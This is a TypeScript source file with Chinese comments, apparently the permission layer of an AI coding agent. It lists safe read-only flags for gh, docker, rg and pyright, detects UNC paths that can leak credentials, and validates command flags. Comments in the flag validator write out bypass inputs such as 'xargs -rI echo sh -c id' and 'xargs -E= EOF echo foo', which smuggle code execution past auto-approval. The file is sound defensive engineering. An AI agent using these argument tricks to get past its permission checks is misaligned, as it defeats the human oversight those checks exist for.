    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr diff 是只读命令 — 显示 pull request diff
  'gh pr diff': {
    safeFlags: {
      '--color': 'string',
      '--name-only': 'none',
      '--patch': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr checks 是只读命令 — 显示 CI 状态检查
  'gh pr checks': {
    safeFlags: {
      '--watch': 'none',
      '--required': 'none',
      '--fail-fast': 'none',
      '--json': 'string',
      '--interval': 'number',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue view 是只读命令 — 显示 issue 详情
  'gh issue view': {
    safeFlags: {
      '--json': 'string',
      '--comments': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue list 是只读命令 — 列出 issue
  'gh issue list': {
    safeFlags: {
      '--state': 'string',
      '-s': 'string',
      '--assignee': 'string',
      '--author': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--milestone': 'string',
      '--search': 'string',
      '--json': 'string',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh repo view 是只读命令 — 显示仓库详情
  // 注意：gh repo view 使用位置参数，而不是 --repo/-R flag
  'gh repo view': {
    safeFlags: {
      '--json': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run list 是只读命令 — 列出 workflow 运行记录
  'gh run list': {
    safeFlags: {
      '--branch': 'string', // 按分支过滤
      '-b': 'string',
      '--status': 'string', // 按状态过滤
      '-s': 'string',
      '--workflow': 'string', // 按 workflow 过滤
      '-w': 'string', // 注意：这里的 -w 是 --workflow，而不是 --web（gh run list 没有 --web）
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
      '--event': 'string', // 按事件类型过滤
      '-e': 'string',
      '--user': 'string', // 按用户过滤
      '-u': 'string',
      '--created': 'string', // 按创建日期过滤
      '--commit': 'string', // 按 commit SHA 过滤
      '-c': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh run view 是只读命令 — 显示某次 workflow 运行的详情
  'gh run view': {
    safeFlags: {
      '--log': 'none', // 显示完整的运行日志
      '--log-failed': 'none', // 只显示失败步骤的日志
      '--exit-status': 'none', // 以运行的状态码退出
      '--verbose': 'none', // 显示 job 步骤
      '-v': 'none', // 注意：这里的 -v 是 --verbose，而不是 --web
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
      '--job': 'string', // 查看指定 ID 的 job
      '-j': 'string',
      '--attempt': 'number', // 查看指定次数的尝试
      '-a': 'number',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh auth status 是只读命令 — 显示认证状态
  // 注意：刻意排除 --show-token/-t（会泄露密钥）
  'gh auth status': {
    safeFlags: {
      '--active': 'none', // 只显示当前激活的账号
      '-a': 'none',
      '--hostname': 'string', // 检查指定的 hostname
      '-h': 'string',
      '--json': 'string', // JSON 字段选择
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr status 是只读命令 — 显示与你相关的 PR
  'gh pr status': {
    safeFlags: {
      '--conflict-status': 'none', // 显示合并冲突状态
      '-c': 'none',
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue status 是只读命令 — 显示与你相关的 issue
  'gh issue status': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release list 是只读命令 — 列出 release
  'gh release list': {
    safeFlags: {
      '--exclude-drafts': 'none', // 排除草稿 release
      '--exclude-pre-releases': 'none', // 排除预发布
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--order': 'string', // 排序方向：asc|desc
      '-O': 'string',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh release view 是只读命令 — 显示 release 详情
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh release view': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow list 是只读命令 — 列出 workflow 文件
  'gh workflow list': {
    safeFlags: {
      '--all': 'none', // 包含已禁用的 workflow
      '-a': 'none',
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh workflow view 是只读命令 — 显示 workflow 概要
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh workflow view': {
    safeFlags: {
      '--ref': 'string', // workflow 版本所在的分支/tag
      '-r': 'string',
      '--yaml': 'none', // 查看 workflow yaml
      '-y': 'none',
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh label list 是只读命令 — 列出 label
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh label list': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--order': 'string', // 排序方向：asc|desc
      '--search': 'string', // 搜索 label 名
      '-S': 'string',
      '--sort': 'string', // 排序字段：created|name
      '--repo': 'string', // 目标仓库
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh search repos 是只读命令 — 搜索仓库
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh search repos': {
    safeFlags: {
      '--archived': 'none', // 按归档状态过滤
      '--created': 'string', // 按创建日期过滤
      '--followers': 'string', // 按关注者数量过滤
      '--forks': 'string', // 按 fork 数量过滤
      '--good-first-issues': 'string', // 按 good first issues 过滤
      '--help-wanted-issues': 'string', // 按 help wanted issues 过滤
      '--include-forks': 'string', // 包含 fork：false|true|only
      '--json': 'string', // JSON 字段选择
      '--language': 'string', // 按语言过滤
      '--license': 'string', // 按许可证过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--match': 'string', // 限定字段：name|description|readme
      '--number-topics': 'string', // 按 topic 数量过滤
      '--order': 'string', // 排序方向：asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--size': 'string', // 按大小范围过滤
      '--sort': 'string', // 排序字段：forks|help-wanted-issues|stars|updated
      '--stars': 'string', // 按 star 数过滤
      '--topic': 'string', // 按 topic 过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search issues 是只读命令 — 搜索 issue
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh search issues': {
    safeFlags: {
      '--app': 'string', // 按 GitHub App 作者过滤
      '--assignee': 'string', // 按 assignee 过滤
      '--author': 'string', // 按作者过滤
      '--closed': 'string', // 按关闭日期过滤
      '--commenter': 'string', // 按评论者过滤
      '--comments': 'string', // 按评论数过滤
      '--created': 'string', // 按创建日期过滤
      '--include-prs': 'none', // 结果中包含 PR
      '--interactions': 'string', // 按互动数过滤
      '--involves': 'string', // 按参与人过滤
      '--json': 'string', // JSON 字段选择
      '--label': 'string', // 按 label 过滤
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--locked': 'none', // 过滤已锁定的对话
      '--match': 'string', // 限定字段：title|body|comments
      '--mentions': 'string', // 按 @mention 过滤
      '--milestone': 'string', // 按 milestone 过滤
      '--no-assignee': 'none', // 过滤无 assignee 的项
      '--no-label': 'none', // 过滤无 label 的项
      '--no-milestone': 'none', // 过滤无 milestone 的项
      '--no-project': 'none', // 过滤无 project 的项
      '--order': 'string', // 排序方向：asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--project': 'string', // 按 project 过滤
      '--reactions': 'string', // 按 reaction 数过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--sort': 'string', // 排序字段
      '--state': 'string', // 过滤：open|closed
      '--team-mentions': 'string', // 按 team mention 过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search prs 是只读命令 — 搜索 pull request
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh search prs': {
    safeFlags: {
      '--app': 'string', // 按 GitHub App 作者过滤
      '--assignee': 'string', // 按 assignee 过滤
      '--author': 'string', // 按作者过滤
      '--base': 'string', // 按 base 分支过滤
      '-B': 'string',
      '--checks': 'string', // 按 check 状态过滤
      '--closed': 'string', // 按关闭日期过滤
      '--commenter': 'string', // 按评论者过滤
      '--comments': 'string', // 按评论数过滤
      '--created': 'string', // 按创建日期过滤
      '--draft': 'none', // 过滤草稿 PR
      '--head': 'string', // 按 head 分支过滤
      '-H': 'string',
      '--interactions': 'string', // 按互动数过滤
      '--involves': 'string', // 按参与人过滤
      '--json': 'string', // JSON 字段选择
      '--label': 'string', // 按 label 过滤
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--locked': 'none', // 过滤已锁定的对话
      '--match': 'string', // 限定字段：title|body|comments
      '--mentions': 'string', // 按 @mention 过滤
      '--merged': 'none', // 过滤已合并的 PR
      '--merged-at': 'string', // 按合并日期过滤
      '--milestone': 'string', // 按 milestone 过滤
      '--no-assignee': 'none', // 过滤无 assignee 的项
      '--no-label': 'none', // 过滤无 label 的项
      '--no-milestone': 'none', // 过滤无 milestone 的项
      '--no-project': 'none', // 过滤无 project 的项
      '--order': 'string', // 排序方向：asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--project': 'string', // 按 project 过滤
      '--reactions': 'string', // 按 reaction 数过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--review': 'string', // 按 review 状态过滤
      '--review-requested': 'string', // 按被请求 review 过滤
      '--reviewed-by': 'string', // 按 reviewer 过滤
      '--sort': 'string', // 排序字段
      '--state': 'string', // 过滤：open|closed
      '--team-mentions': 'string', // 按 team mention 过滤
      '--updated': 'string', // 按更新日期过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search commits 是只读命令 — 搜索 commit
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh search commits': {
    safeFlags: {
      '--author': 'string', // 按作者过滤
      '--author-date': 'string', // 按作者日期过滤
      '--author-email': 'string', // 按作者邮箱过滤
      '--author-name': 'string', // 按作者姓名过滤
      '--committer': 'string', // 按提交者过滤
      '--committer-date': 'string', // 按提交日期过滤
      '--committer-email': 'string', // 按提交者邮箱过滤
      '--committer-name': 'string', // 按提交者姓名过滤
      '--hash': 'string', // 按 commit hash 过滤
      '--json': 'string', // JSON 字段选择
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--merge': 'none', // 过滤合并 commit
      '--order': 'string', // 排序方向：asc|desc
      '--owner': 'string', // 按 owner 过滤
      '--parent': 'string', // 按 parent hash 过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--sort': 'string', // 排序：author-date|committer-date
      '--tree': 'string', // 按 tree hash 过滤
      '--visibility': 'string', // 过滤：public|private|internal
    },
  },
  // gh search code 是只读命令 — 搜索代码
  // 注意：刻意排除 --web/-w（会打开浏览器）
  'gh search code': {
    safeFlags: {
      '--extension': 'string', // 按文件扩展名过滤
      '--filename': 'string', // 按文件名过滤
      '--json': 'string', // JSON 字段选择
      '--language': 'string', // 按语言过滤
      '--limit': 'number', // 最大结果数
      '-L': 'number',
      '--match': 'string', // 限定：file|path
      '--owner': 'string', // 按 owner 过滤
      '--repo': 'string', // 按仓库过滤
      '-R': 'string',
      '--size': 'string', // 按大小范围过滤
    },
  },
}

// ---------------------------------------------------------------------------
// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs 只读命令
// ---------------------------------------------------------------------------

export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
  {
    'docker logs': {
      safeFlags: {
        '--follow': 'none',
        '-f': 'none',
        '--tail': 'string',
        '-n': 'string',
        '--timestamps': 'none',
        '-t': 'none',
        '--since': 'string',
        '--until': 'string',
        '--details': 'none',
      },
    },
    'docker inspect': {
      safeFlags: {
        '--format': 'string',
        '-f': 'string',
        '--type': 'string',
        '--size': 'none',
        '-s': 'none',
      },
    },
  }

// ---------------------------------------------------------------------------
// RIPGREP_READ_ONLY_COMMANDS — rg（ripgrep）只读搜索
// ---------------------------------------------------------------------------

export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
  {
    rg: {
      safeFlags: {
        // 模式 flag
        '-e': 'string', // 要搜索的模式
        '--regexp': 'string',
        '-f': 'string', // 从文件读取模式

        // 常用搜索选项
        '-i': 'none', // 大小写不敏感
        '--ignore-case': 'none',
        '-S': 'none', // 智能大小写
        '--smart-case': 'none',
        '-F': 'none', // 固定字符串
        '--fixed-strings': 'none',
        '-w': 'none', // 单词正则
        '--word-regexp': 'none',
        '-v': 'none', // 反向匹配
        '--invert-match': 'none',

        // 输出选项
        '-c': 'none', // 统计匹配数
        '--count': 'none',
        '-l': 'none', // 只输出含匹配的文件名
        '--files-with-matches': 'none',
        '--files-without-match': 'none',
        '-n': 'none', // 行号
        '--line-number': 'none',
        '-o': 'none', // 只输出匹配部分
        '--only-matching': 'none',
        '-A': 'number', // 匹配行之后的上下文
        '--after-context': 'number',
        '-B': 'number', // 匹配行之前的上下文
        '--before-context': 'number',
        '-C': 'number', // 前后上下文
        '--context': 'number',
        '-H': 'none', // 显示文件名
        '-h': 'none', // 不显示文件名
        '--heading': 'none',
        '--no-heading': 'none',
        '-q': 'none', // 静默模式
        '--quiet': 'none',
        '--column': 'none',

        // 文件过滤
        '-g': 'string', // glob
        '--glob': 'string',
        '-t': 'string', // 类型
        '--type': 'string',
        '-T': 'string', // 排除类型
        '--type-not': 'string',
        '--type-list': 'none',
        '--hidden': 'none',
        '--no-ignore': 'none',
        '-u': 'none', // 不受限

        // 常用选项
        '-m': 'number', // 每个文件的最大匹配数
        '--max-count': 'number',
        '-d': 'number', // 最大深度
        '--max-depth': 'number',
        '-a': 'none', // 文本模式（搜索二进制文件）
        '--text': 'none',
        '-z': 'none', // 搜索 zip
        '-L': 'none', // 跟随符号链接
        '--follow': 'none',

        // 显示选项
        '--color': 'string',
        '--json': 'none',
        '--stats': 'none',

        // 帮助与版本
        '--help': 'none',
        '--version': 'none',
        '--debug': 'none',

        // 特殊参数分隔符
        '--': 'none',
      },
    },
  }

// ---------------------------------------------------------------------------
// PYRIGHT_READ_ONLY_COMMANDS — pyright 静态类型检查器
// ---------------------------------------------------------------------------

export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
  {
    pyright: {
      respectsDoubleDash: false, // pyright 把 -- 当作文件路径，而不是选项终止符
      safeFlags: {
        '--outputjson': 'none',
        '--project': 'string',
        '-p': 'string',
        '--pythonversion': 'string',
        '--pythonplatform': 'string',
        '--typeshedpath': 'string',
        '--venvpath': 'string',
        '--level': 'string',
        '--stats': 'none',
        '--verbose': 'none',
        '--version': 'none',
        '--dependencies': 'none',
        '--warnings': 'none',
      },
      additionalCommandIsDangerousCallback: (
        _rawCommand: string,
        args: string[],
      ) => {
        // 检查 --watch 或 -w 是否作为独立 token（flag）出现
        return args.some(t => t === '--watch' || t === '-w')
      },
    },
  }

// ---------------------------------------------------------------------------
// EXTERNAL_READONLY_COMMANDS — 跨 shell 只读命令
// 仅包含在 Windows 下 bash 和 PowerShell 中行为完全一致的命令。
// Unix 专有命令（cat、head、wc 等）应放在 BashTool 的 READONLY_COMMANDS 中。
// ---------------------------------------------------------------------------

export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
  // 在 Windows 下 bash 和 PowerShell 中行为一致的跨平台外部工具
  'docker ps',
  'docker images',
] as const

// ---------------------------------------------------------------------------
// UNC 路径检测（Bash 和 PowerShell 共享）
// ---------------------------------------------------------------------------

/**
 * 检查路径或命令是否包含可能触发网络请求的 UNC 路径
 * （NTLM/Kerberos 凭据泄露、WebDAV 攻击）。
 *
 * 本函数检测：
 * - 基础 UNC 路径：\\server\share、\\foo.com\file
 * - WebDAV 模式：\\server@SSL@8443\、\\server@8443@SSL\、\\server\DavWWWRoot\
 * - 基于 IP 的 UNC：\\192.168.1.1\share、\\[2001:db8::1]\share
 * - 正斜杠变体：//server/share
 *
 * @param pathOrCommand 要检查的路径或命令字符串
 * @returns 如果路径/命令包含潜在易受攻击的 UNC 路径，返回 true
 */
export function containsVulnerableUncPath(pathOrCommand: string): boolean {
  // 仅在 Windows 平台检查
  if (getPlatform() !== 'windows') {
    return false
  }

  // 1. 检查使用反斜杠的常规 UNC 路径
  // 模式匹配：\\server、\\server\share、\\server/share、\\server@port\share
  // 使用 [^\s\\/]+ 匹配 hostname，以捕获 Unicode 同形字和其他非 ASCII 字符
  // 尾部同时接受 \ 和 /，因为 Windows 把两者都视为路径分隔符
  const backslashUncPattern = /\\\\[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
  if (backslashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 2. 检查正斜杠 UNC 路径
  // 模式匹配：//server、//server/share、//server\share、//192.168.1.1/share
  // 使用负向 lookbehind (?<!:) 排除 URL（https://、http://、ftp://），
  // 同时捕获前面是引号、= 或任何其他非冒号字符的 //。
  // 尾部同时接受 / 和 \，因为 Windows 把两者都视为路径分隔符
  const forwardSlashUncPattern =
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- 仅对短命令字符串调用 .test()
    /(?<!:)\/\/[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
  if (forwardSlashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 3. 检查混合分隔符的 UNC 路径（正斜杠 + 反斜杠）
  // 在 Windows/Cygwin 下，/\ 等价于 //，因为两者都是路径分隔符。
  // 在 bash 中，/\\server 经过转义处理后变为 /\server，这就是一个 UNC 路径。
  // 要求 / 之后至少 2 个反斜杠，因为单个反斜杠只会转义下一个字符
  // （例如 /\a 在 bash 处理后变成 /a，不是 UNC 路径）。
  const mixedSlashUncPattern = /\/\\{2,}[^\s\\/]/
  if (mixedSlashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 4. 检查混合分隔符的 UNC 路径（反斜杠 + 正斜杠）
  // bash 中的 \\/server 经过转义处理后变为 \/server，在 Windows 上是一个 UNC 路径，
  // 因为 \ 和 / 都是路径分隔符。
  const reverseMixedSlashUncPattern = /\\{2,}\/[^\s\\/]/
  if (reverseMixedSlashUncPattern.test(pathOrCommand)) {
    return true
  }

  // 5. 检查 WebDAV SSL/端口模式
  // 示例：\\server@SSL@8443\path、\\server@8443@SSL\path
  if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
    return true
  }

  // 6. 检查 DavWWWRoot 标记（Windows WebDAV 重定向器）
  // 示例：\\server\DavWWWRoot\path
  if (/DavWWWRoot/i.test(pathOrCommand)) {
    return true
  }

  // 7. 检查带 IPv4 地址的 UNC 路径（为防御深度做的显式检查）
  // 示例：\\192.168.1.1\share、\\10.0.0.1\path
  if (
    /^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
    /^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)
  ) {
    return true
  }

  // 8. 检查带方括号 IPv6 地址的 UNC 路径（为防御深度做的显式检查）
  // 示例：\\[2001:db8::1]\share、\\[::1]\path
  if (
    /^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
    /^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)
  ) {
    return true
  }

  return false
}

// ---------------------------------------------------------------------------
// Flag 校验工具
// ---------------------------------------------------------------------------

// 匹配合法 flag 名（字母、数字、下划线、连字符）的正则
export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/

/**
 * 根据期望的类型校验 flag 参数
 */
export function validateFlagArgument(
  value: string,
  argType: FlagArgType,
): boolean {
  switch (argType) {
    case 'none':
      return false // 对 'none' 类型根本不应该调用本函数
    case 'number':
      return /^\d+$/.test(value)
    case 'string':
      return true // 任何字符串（包括空串）都合法
    case 'char':
      return value.length === 1
    case '{}':
      return value === '{}'
    case 'EOF':
      return value === 'EOF'
    default:
      return false
  }
}

/**
 * 根据配置校验已分词命令中 flags/arguments 部分。
 * 这是从 BashTool 的 isCommandSafeViaFlagParsing 中抽出的 flag 遍历循环。
 *
 * @param tokens - 已分词的参数（来自 bash shell-quote 或 PowerShell AST）
 * @param startIndex - 从哪里开始校验（command token 之后）
 * @param config - safe flags 配置
 * @param options.commandName - 用于针对具体命令的特殊处理（git 数字简写、grep/rg 带数字参数）
 * @param options.rawCommand - 用于 additionalCommandIsDangerousCallback
 * @param options.xargsTargetCommands - 若提供，则启用 xargs 式目标命令检测
 * @returns 所有 flag 都合法返回 true，否则返回 false
 */
export function validateFlags(
  tokens: string[],
  startIndex: number,
  config: ExternalCommandConfig,
  options?: {
    commandName?: string
    rawCommand?: string
    xargsTargetCommands?: string[]
  },
): boolean {
  let i = startIndex

  while (i < tokens.length) {
    let token = tokens[i]
    if (!token) {
      i++
      continue
    }

    // 针对 xargs 的特殊处理：一旦遇到目标命令就停止校验 flag
    if (
      options?.xargsTargetCommands &&
      options.commandName === 'xargs' &&
      (!token.startsWith('-') || token === '--')
    ) {
      if (token === '--' && i + 1 < tokens.length) {
        i++
        token = tokens[i]
      }
      if (token && options.xargsTargetCommands.includes(token)) {
        break
      }
      return false
    }

    if (token === '--') {
      // 安全性：仅当工具遵循 POSIX `--`（默认为 true）时才跳出。
      // pyright 等工具不遵循 `--` — 它会把 `--` 当作文件路径，
      // 并继续把后续 token 当作 flag 处理。如果在这里直接 break，
      // `pyright -- --createstub os` 就会被自动批准一个写文件的 flag。
      if (config.respectsDoubleDash !== false) {
        i++
        break // -- 之后的都是参数
      }
      // 工具不遵循 --：当作位置参数处理，继续校验后续 token
      i++
      continue
    }

    if (token.startsWith('-') && token.length > 1 && FLAG_PATTERN.test(token)) {
      // 处理 --flag=value 格式
      // 安全性：把「token 是否包含 `=`」与「值是否非空」分开追踪。
      // `-E=` 满足 hasEquals=true，但 inlineValue=''（falsy）。如果没有 hasEquals，
      // 下方约 1813 行的 falsy 判断就会落入「消费下一个 token」分支 —— 但 GNU
      // getopt 对必带参数的短选项会把 `-E=` 视为 `-E` + 附带参数 `=`（短选项
      // 不会剥离 `=`）。解析器差异：校验器前进 2 个 token，GNU 前进 1 个。
      //
      // 攻击：`xargs -E= EOF echo foo`（零权限）
      //   校验器：inlineValue='' falsy → 把 EOF 当作 -E 的参数 → i+=2 →
      //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → break → 自动批准
      //   GNU xargs：-E 附带参数 `=` → EOF 是目标命令 → 代码执行
      //
      // 修复：当 hasEquals 为 true 时，使用 inlineValue（即使为空）作为已提供的
      // 参数。validateFlagArgument('', 'EOF') → false → 被拒绝。
      // 这对所有参数类型都正确：用户显式输入了 `=`，表示他们提供（空的）值。
      // 不要消费下一个 token。
      const hasEquals = token.includes('=')
      const [flag, ...valueParts] = token.split('=')
      const inlineValue = valueParts.join('=')

      if (!flag) {
        return false
      }

      const flagArgType = config.safeFlags[flag]

      if (!flagArgType) {
        // 特例：git 命令支持 -<数字> 作为 -n <数字> 的简写
        if (options?.commandName === 'git' && flag.match(/^-\d+$/)) {
          // 等价于 -n flag，对 git log/diff/show 是安全的
          i++
          continue
        }

        // 处理直接附带数字参数的 flag（例如 -A20、-B10）
        // 只对 grep 和 rg 命令启用这种特殊处理
        if (
          (options?.commandName === 'grep' || options?.commandName === 'rg') &&
          flag.startsWith('-') &&
          !flag.startsWith('--') &&
          flag.length > 2
        ) {
          const potentialFlag = flag.substring(0, 2) // 例如从 '-A20' 取 '-A'
          const potentialValue = flag.substring(2) // 例如从 '-A20' 取 '20'

          if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
            // 这是一个带附带数字参数的 flag
            const flagArgType = config.safeFlags[potentialFlag]
            if (flagArgType === 'number' || flagArgType === 'string') {
              // 校验数字值
              if (validateFlagArgument(potentialValue, flagArgType)) {
                i++
                continue
              } else {
                return false // 附带值不合法
              }
            }
          }
        }

        // 处理类似 -nr 的组合单字母 flag
        // 安全性：我们绝不能允许任何带参数的 flag 进入 bundle。
        // GNU getopt bundling 语义：当一个带参数选项作为 bundle 的最后一个、
        // 且后面没有其他字符时，下一个 argv 元素会被当作它的参数。
        // 因此 `xargs -rI echo sh -c id` 被 xargs 解析为：
        //   -r（无参）+ -I（replace-str=`echo`），target=`sh -c id`
        // 我们此前朴素的处理器只检查 safeFlags 中的存在性（`-r: 'none'` 和
        // `-I: '{}'` 都是真值），随后 `i++` 只消费了一个 token。
        // 这就产生了 parser differential：校验器以为 `echo` 是 xargs 的目标
        // （在 SAFE_TARGET_COMMANDS_FOR_XARGS 中 → break），而 xargs 实际
        // 执行的是 `sh -c id`。只要有 Bash(echo:*) 权限就能任意 RCE。
        //
        // 修复：要求所有 bundled flag 都是 'none' 类型。如果 bundle 中任何
        // 一个 flag 需要参数（非 'none' 类型），整个 bundle 都拒绝。
        // 这比较保守 —— 它会完全阻止 `-rI`（xargs），但这是安全的方向。
        // 需要 `-I` 的用户可以不用 bundle：`-r -I {}`。
        if (flag.startsWith('-') && !flag.startsWith('--') && flag.length > 2) {
          for (let j = 1; j < flag.length; j++) {
            const singleFlag = '-' + flag[j]
            const flagType = config.safeFlags[singleFlag]
            if (!flagType) {
              return false // 组合中的某个 flag 不安全
            }
            // 安全性：bundled flag 必须是无参类型。带参数的 flag 在 bundle 中
            // 会按 GNU getopt 规则消费下一个 token，而我们的处理器并未建模这种情况。
            // 拒绝以避免 parser differential。
            if (flagType !== 'none') {
              return false // bundle 中存在带参数的 flag —— 无法安全校验
            }
          }
          i++
          continue
        } else {
          return false // 未知 flag
        }
      }

      // 校验 flag 参数
      if (flagArgType === 'none') {
        // 安全性：hasEquals 涵盖 `-FLAG=`（inline 为空）的情况。如果没有它，
        // `-FLAG=` 搭配 'none' 类型就会通过（因为 inlineValue='' 是 falsy）。
        if (hasEquals) {
          return false // flag 不应该带值
        }
        i++
      } else {
        let argValue: string
        // 安全性：用 hasEquals（而不是 inlineValue 的真值判断）。`-E=` 绝不能
        // 消费下一个 token —— 用户已经显式提供了空值。
        if (hasEquals) {
          argValue = inlineValue
          i++
        } else {
          // 检查下一个 token 是否是参数
          if (
            i + 1 >= tokens.length ||
            (tokens[i + 1] &&
              tokens[i + 1]!.startsWith('-') &&
              tokens[i + 1]!.length > 1 &&
              FLAG_PATTERN.test(tokens[i + 1]!))
          ) {
            return false // 缺少必需的参数
          }
          argValue = tokens[i + 1] || ''
          i += 2
        }

        // 防御深度：对 string 类型的参数，拒绝以 '-' 开头的值。
        // 这样可以防止类型混淆攻击 —— 某个被标记为 'string' 但实际不接参数的
        // flag 被利用来注入危险 flag。
        // 例外：git 的 --sort flag 的值可以以 '-' 开头，用于反向排序
        if (flagArgType === 'string' && argValue.startsWith('-')) {
          // 特例：git 的 --sort flag 允许以 '-' 前缀表示反向排序
          if (
            flag === '--sort' &&
            options?.commandName === 'git' &&
            argValue.match(/^-[a-zA-Z]/)
          ) {
            // 这看起来像反向排序（例如 -refname、-version:refname）
            // 如果剩余部分像合法的 sort key 就放行
          } else {
            return false
          }
        }

        // 根据类型校验参数
        if (!validateFlagArgument(argValue, flagArgType)) {
          return false
        }
      }
    } else {
      // 非 flag 参数（例如 revision spec、文件路径等） - 允许
      i++
    }
  }

  return true
}
